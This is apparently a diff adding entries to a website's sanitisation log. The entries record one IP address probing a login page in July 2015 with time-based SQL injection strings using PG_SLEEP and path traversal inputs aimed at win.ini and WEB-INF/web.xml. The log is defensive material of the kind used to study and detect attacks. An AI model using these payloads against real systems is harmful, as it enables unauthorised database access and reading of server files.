+Date: 28-07-2015 01:05:07 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/' AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) -- , Fixed: http://www.a3ultimate.com/ACP/ AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:05:11 PM IP: 43.245.149.43 User : Not loggedin Code: " AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) --, Fixed:  AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) --, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:05:16 PM IP: 43.245.149.43 User : Not loggedin Code: C:\windows\win.ini, Fixed: C:windowswin.ini, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:05:17 PM IP: 43.245.149.43 User : Not loggedin Code: " AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) --, Fixed:  AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) --, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:05:17 PM IP: 43.245.149.43 User : Not loggedin Code: " AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) --, Fixed:  AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) --, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:05:22 PM IP: 43.245.149.43 User : Not loggedin Code: ' AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) --, Fixed:  AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) --, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:05:27 PM IP: 43.245.149.43 User : Not loggedin Code: ' AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) --, Fixed:  AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) --, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:05:29 PM IP: 43.245.149.43 User : Not loggedin Code: ' AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) --, Fixed:  AND 81223=(SELECT 32233 FROM PG_SLEEP(35)) --, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:05:41 PM IP: 43.245.149.43 User : Not loggedin Code: ..\..\..\..\..\..\..\..\..\..\..\..\/windows/win.ini, Fixed: ......................../windows/win.ini, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:05:47 PM IP: 43.245.149.43 User : Not loggedin Code: ..\..\..\..\..\..\..\..\..\..\..\..\/windows/win.ini, Fixed: ......................../windows/win.ini, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:06:09 PM IP: 43.245.149.43 User : Not loggedin Code: ..\..\WEB-INF\web.xml, Fixed: ....WEB-INFweb.xml, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:06:16 PM IP: 43.245.149.43 User : Not loggedin Code: ..\..\WEB-INF\web.xml, Fixed: ....WEB-INFweb.xml, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:06:19 PM IP: 43.245.149.43 User : Not loggedin Code: \..\..\WEB-INF\web.xml, Fixed: ....WEB-INFweb.xml, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:06:24 PM IP: 43.245.149.43 User : Not loggedin Code: \..\..\WEB-INF\web.xml, Fixed: ....WEB-INFweb.xml, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:06:26 PM IP: 43.245.149.43 User : Not loggedin Code: ..\..\WEB-INF/web.xml, Fixed: ....WEB-INF/web.xml, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:06:30 PM IP: 43.245.149.43 User : Not loggedin Code: ..\..\WEB-INF/web.xml, Fixed: ....WEB-INF/web.xml, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:06:51 PM IP: 43.245.149.43 User : Not loggedin Code: WEB-INF\web.xml, Fixed: WEB-INFweb.xml, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:06:59 PM IP: 43.245.149.43 User : Not loggedin Code: WEB-INF\web.xml, Fixed: WEB-INFweb.xml, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:07:01 PM IP: 43.245.149.43 User : Not loggedin Code: \WEB-INF\web.xml, Fixed: WEB-INFweb.xml, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:07:11 PM IP: 43.245.149.43 User : Not loggedin Code: \WEB-INF\web.xml, Fixed: WEB-INFweb.xml, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:08:06 PM IP: 43.245.149.43 User : Not loggedin Code: \..\WEB-INF\web.xml, Fixed: ..WEB-INFweb.xml, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:08:09 PM IP: 43.245.149.43 User : Not loggedin Code: \..\WEB-INF\web.xml, Fixed: ..WEB-INFweb.xml, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:08:14 PM IP: 43.245.149.43 User : Not loggedin Code: \..\..\..\WEB-INF\web.xml, Fixed: ......WEB-INFweb.xml, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:08:16 PM IP: 43.245.149.43 User : Not loggedin Code: \..\..\..\WEB-INF\web.xml, Fixed: ......WEB-INFweb.xml, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:08:22 PM IP: 43.245.149.43 User : Not loggedin Code: \..\..\..\..\WEB-INF\web.xml, Fixed: ........WEB-INFweb.xml, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:08:23 PM IP: 43.245.149.43 User : Not loggedin Code: \..\..\..\..\WEB-INF\web.xml, Fixed: ........WEB-INFweb.xml, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:08:29 PM IP: 43.245.149.43 User : Not loggedin Code: \..\..\..\..\..\WEB-INF\web.xml, Fixed: ..........WEB-INFweb.xml, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 01:08:31 PM IP: 43.245.149.43 User : Not loggedin Code: \..\..\..\..\..\WEB-INF\web.xml, Fixed: ..........WEB-INFweb.xml, Link: http://www.a3ultimate.com/login.php
